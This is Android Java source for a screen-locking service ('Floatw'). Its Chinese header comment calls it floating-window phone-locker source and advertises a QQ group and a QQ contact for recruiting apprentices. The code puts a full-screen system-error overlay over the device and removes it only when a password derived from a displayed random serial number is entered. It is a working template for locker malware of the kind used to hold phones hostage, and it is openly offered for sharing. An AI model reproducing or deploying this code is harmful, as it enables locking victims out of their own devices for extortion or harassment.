package com.dedett.qqzan;



import android.*;
import android.app.*;
import android.content.*;
import android.graphics.*;
import android.net.*;
import android.os.*;
import android.view.*;
import android.view.View.*;
import android.view.WindowManager.*;
import android.widget.*;

/**
 * 悬浮窗锁机源码
锁机源码群30551723
序列号锁机源码 
 
收徒中QQ1576478985
 
 */
public class  Floatw extends Service {

    long jv;
    private WindowManager.LayoutParams wmParams;
    private WindowManager mWindowManager;
    private LinearLayout mFloatLayout;

    private Handler mHandler;

	int number=(int) ((Math.random()+1)*100000);
	
	int my_password=(number);//
	
    private Runnable mRunnable = new Runnable() {
        @Override
        public void run() {
        //随机号码
			TextView text_number=(TextView) mFloatLayout.findViewById(R.id.number_m);
			
	  //		text_number.setText("当前序列号为:"+String.valueOf(number));//转化int并显示
	
	String str =Floatw.  this.getResources().getString(R.string.number_string);
//获取文字:当前序列号为
	text_number.setText(str+String.valueOf(number));
			
	
	
			//输入框ID
			final EditText etext=(EditText) mFloatLayout.findViewById(R.id.stext);
			

            Button bn=(Button)mFloatLayout.findViewById(R.id.button);

            bn.setOnClickListener(new OnClickListener(){

                    @Override
                    public void onClick(View p1)
                    {
						String mp=String.valueOf(my_password);
					//判断输入框内容是否是密码
						if(etext.getText().toString().equals(mp)){
					
						stopService(new Intent(Floatw.this,Floatw.class));
						//停止悬浮窗
						
						
                      }else{//否则提示密码错误
		  
					   final TextView false_text=(TextView) mFloatLayout.findViewById(R.id.nottrue);
						  
					   
					   // Floatw. this.getResources().getString(R.string.onttrue);获取string下的字符串
						   
					   
					   false_text.setText(Floatw. this.getResources().getString(R.string.nottrue));
					//   false_text.setText ("密码错误");
					
					
	
						   
						   new Handler().postDelayed(new Runnable(){
								   @Override	
								   public void run(
								   ){//执行的事件
									 
								   false_text.setText(null);
								   }
							   },1000);//时间
						   
					
					
						   }
						   
						   
	
					   
                        
                     
                    }
                });

                
        }



    };





    @Override
    public void onCreate() {
        super.onCreate();
        createFloatView();



        mHandler = new Handler(){
            
            @Override
            public void handleMessage(Message msg) {
                super.handleMessage(msg);
                if (msg.what == 1) {

                }
            }
        };


    }
    @Override
    public void onStart(Intent intent, int startId) {
        mHandler.postDelayed(mRunnable, 0);
    };
    /**
     * 使事件有效
     */


    @Override
    public void onDestroy() {
        mHandler.removeCallbacks(mRunnable);
        if(mFloatLayout != null)
        {

            mWindowManager.removeView(mFloatLayout);

        }
        super.onDestroy();
    };




    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }


    private void createFloatView()
    {
        wmParams = new WindowManager.LayoutParams();
        mWindowManager = (WindowManager)getApplication().getSystemService(getApplication().WINDOW_SERVICE);
        wmParams.type = LayoutParams. TYPE_SYSTEM_ERROR;
        wmParams.format = PixelFormat.RGBA_8888;
        
        wmParams.flags = LayoutParams.FLAG_FULLSCREEN| LayoutParams.FLAG_LAYOUT_IN_SCREEN;

       
        wmParams.width = WindowManager.LayoutParams.FILL_PARENT;
        wmParams.height = WindowManager.LayoutParams.FILL_PARENT;
        LayoutInflater inflater = LayoutInflater.from(getApplication());
        mFloatLayout = (LinearLayout) inflater.inflate(R.layout.null_a, null);

        mWindowManager.addView(mFloatLayout, wmParams);

        mFloatLayout.measure(View.MeasureSpec.makeMeasureSpec(0,
                                                              View.MeasureSpec.UNSPECIFIED), View.MeasureSpec
                             .makeMeasureSpec(0, View.MeasureSpec.UNSPECIFIED));

    }}

